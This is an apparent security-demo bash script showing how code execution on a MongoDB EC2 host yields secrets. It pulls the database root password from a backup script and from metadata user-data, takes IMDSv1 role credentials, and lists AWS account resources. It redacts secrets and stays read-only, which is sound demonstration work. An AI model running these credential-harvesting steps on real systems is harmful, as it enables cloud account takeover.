#!/usr/bin/env bash
# ATTACK: RUN THIS ON THE MONGO VM (after SSHing in). One foothold on this host
# yields two separate prizes:
#
#   A) the MongoDB admin password, in plaintext, twice
#   B) AdministratorAccess credentials for the whole AWS account
#
# ASSUMPTION, stated honestly: this starts from code execution on the instance.
# In the demo that comes from SSHing in with the key pair we own. A real attacker
# needs an OpenSSH or mongod exploit first -- that break-in is the one step this
# script does not demonstrate.
#
# DETECTED BY: CloudTrail logs every API call made with the stolen role.
# NOT DETECTED BY: anything, for part A. Reading a local file and the metadata
#   service generates no API call and no log entry at all.
set -euo pipefail

AWSCLI=/usr/local/bin/aws   # absolute: cron/minimal shells lack /usr/local/bin

# ---------------------------------------------------------------------------
# A) The MongoDB admin password -- the finding every scanner missed.
#
# Six scanners read the repository, where this password is the expression
# `random_password.mongo_admin.result`. There is no credential in any file to
# find. Terraform resolves it only at apply time and writes the literal value
# into this host, so the secret exists exclusively in the running environment.
# That is the structural limit of scanning files.
# ---------------------------------------------------------------------------
echo "[*] A1. The backup script is world-readable by any user on this box:"
ls -l /usr/local/bin/mongo-backup.sh
echo "    (-rwxr-xr-x -- the trailing r is 'everyone can read')"
echo
echo "[*] A2. And it carries the MongoDB ADMIN password in plaintext:"
grep -o -- "--password '[^']*'" /usr/local/bin/mongo-backup.sh \
  | sed -E "s/--password '.*'/--password '<THE MONGODB ROOT PASSWORD>'/"
echo "    Not the app's scoped appuser -- the root account on the database."
echo
echo "[*] A3. The same password is also in the EC2 user-data, which the metadata"
echo "        service hands out with no credentials and no token:"
curl -s http://169.254.169.254/latest/user-data \
  | grep -oE '(pwd|admin_password)[^,]{0,12}' | head -2 \
  | sed -E 's/(pwd|admin_password).*/\1: <THE MONGODB ROOT PASSWORD>/'
echo "    Two independent copies. Neither is in the repository."

# ---------------------------------------------------------------------------
# B) The instance role -- a single-host foothold becomes account takeover.
# http_tokens = "optional" leaves IMDSv1 enabled, so this is a plain GET.
# ---------------------------------------------------------------------------
echo
echo "[*] B1. Instance role credentials via IMDSv1 (no session token required):"
ROLE=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/)
echo "    instance role: $ROLE"
# Print only the non-secret fields. SecretAccessKey and Token are both working
# credentials -- a regex that redacts one and prints the other is worse than
# useless on a shared screen, so parse the JSON and never emit them.
curl -s "http://169.254.169.254/latest/meta-data/iam/security-credentials/${ROLE}" \
  | python3 -c '
import json, sys
d = json.load(sys.stdin)
print("    AccessKeyId     : " + d["AccessKeyId"])
print("    SecretAccessKey : <redacted -- a live credential>")
print("    Token           : <redacted -- a live credential>")
print("    Expiration      : " + d["Expiration"])
'

echo
echo "[*] B2. What that role is allowed to do:"
"$AWSCLI" sts get-caller-identity --query Arn --output text
"$AWSCLI" iam list-attached-role-policies --role-name "$ROLE" \
  --query 'AttachedPolicies[].PolicyName' --output text

# Blast radius. Deliberately NOT `aws s3 ls`: the S3 gateway endpoint policy
# denies s3:ListAllMyBuckets from inside the VPC, so that call fails and makes
# the demo look broken rather than dangerous. These calls are unaffected --
# a gateway endpoint only intercepts S3, so IAM/CloudTrail/GuardDuty traffic
# leaves via the internet gateway and the endpoint policy never sees it.
echo
echo "[*] B3. Blast radius, read-only proof (nothing destructive is executed):"
printf '    IAM roles visible      : %s\n' "$("$AWSCLI" iam list-roles --query 'length(Roles)' --output text)"
printf '    CloudTrail trails      : %s\n' "$("$AWSCLI" cloudtrail describe-trails --query 'trailList[].Name' --output text)"
printf '    GuardDuty detectors    : %s\n' "$("$AWSCLI" guardduty list-detectors --query 'length(DetectorIds)' --output text)"
echo "    Backup bucket contents :"
"$AWSCLI" s3 ls "s3://text2sql-mongo-backups-131166810866/backups/" | sed 's/^/      /' || true

echo
echo "[!] AdministratorAccess means the trail and the detector above are not just"
echo "    readable, they are deletable. An attacker here can take the data AND"
echo "    remove the record of having done it. Not executed in this demo."
echo
echo "[!] One foothold, two prizes: the database root password that no scanner"
echo "    could see, and AdministratorAccess over the entire AWS account."
